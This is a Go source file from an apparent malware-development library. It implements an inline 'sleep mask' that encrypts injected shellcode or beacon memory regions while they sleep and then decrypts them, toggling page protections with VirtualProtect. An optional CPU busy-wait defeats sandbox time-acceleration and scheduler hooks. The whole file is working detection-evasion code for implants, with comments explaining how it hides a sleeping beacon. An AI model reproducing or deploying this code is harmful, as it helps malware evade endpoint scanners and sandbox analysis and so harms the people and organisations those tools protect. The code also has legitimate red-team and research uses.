//go:build windows

package sleepmask

import (
	"context"
	"fmt"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/evasion/timing"
)

// InlineStrategy is the L1 strategy: the caller goroutine runs the
// full encrypt → wait → decrypt cycle itself. Simple, dependency-free,
// and the historical default.
//
// Thread model: single goroutine. The return address of the call to
// Sleep is visible on the goroutine's stack during the wait. This is
// fine when the region being masked is separate from the caller's
// code (e.g. Go loader process masking an injected PIC shellcode
// region). For scenarios where the caller's own stack must not
// identify a sleeping beacon, use TimerQueueStrategy or EkkoStrategy.
type InlineStrategy struct {
	// UseBusyTrig switches the wait from time.Sleep (kernel timer) to
	// evasion/timing.BusyWaitTrig (CPU-bound trig loop). Defeats
	// sandbox time-acceleration and hooks on scheduler waits at the
	// cost of one CPU core pegged for the duration of the sleep.
	UseBusyTrig bool
}

// Cycle implements Strategy.
func (s *InlineStrategy) Cycle(ctx context.Context, regions []Region, cipher Cipher, key []byte, d time.Duration) error {
	origProtect := make([]uint32, len(regions))

	// Encrypt phase — VirtualProtect(RW) BEFORE cipher.Apply; RX pages
	// are not writable and Apply would fault otherwise (v0.11.0 bugfix).
	for i, r := range regions {
		if err := windows.VirtualProtect(r.Addr, r.Size, windows.PAGE_READWRITE, &origProtect[i]); err != nil {
			return fmt.Errorf("sleepmask/inline: encrypt VirtualProtect: %w", err)
		}
		cipher.Apply(unsafe.Slice((*byte)(unsafe.Pointer(r.Addr)), int(r.Size)), key)
	}

	// Wait phase — select between timer/BusyTrig and ctx cancellation.
	waitErr := s.wait(ctx, d)

	// Decrypt phase — always runs, even on ctx cancellation.
	for i, r := range regions {
		var tmp uint32
		windows.VirtualProtect(r.Addr, r.Size, windows.PAGE_READWRITE, &tmp)
		cipher.Apply(unsafe.Slice((*byte)(unsafe.Pointer(r.Addr)), int(r.Size)), key)
		windows.VirtualProtect(r.Addr, r.Size, origProtect[i], &tmp)
	}

	return waitErr
}

// wait blocks for d, honoring ctx. Returns ctx.Err() if cancelled, nil if
// the duration elapsed naturally.
func (s *InlineStrategy) wait(ctx context.Context, d time.Duration) error {
	if s.UseBusyTrig {
		done := make(chan struct{})
		go func() {
			timing.BusyWaitTrig(d)
			close(done)
		}()
		select {
		case <-done:
			return nil
		case <-ctx.Done():
			return ctx.Err()
		}
	}
	t := time.NewTimer(d)
	defer t.Stop()
	select {
	case <-t.C:
		return nil
	case <-ctx.Done():
		return ctx.Err()
	}
}
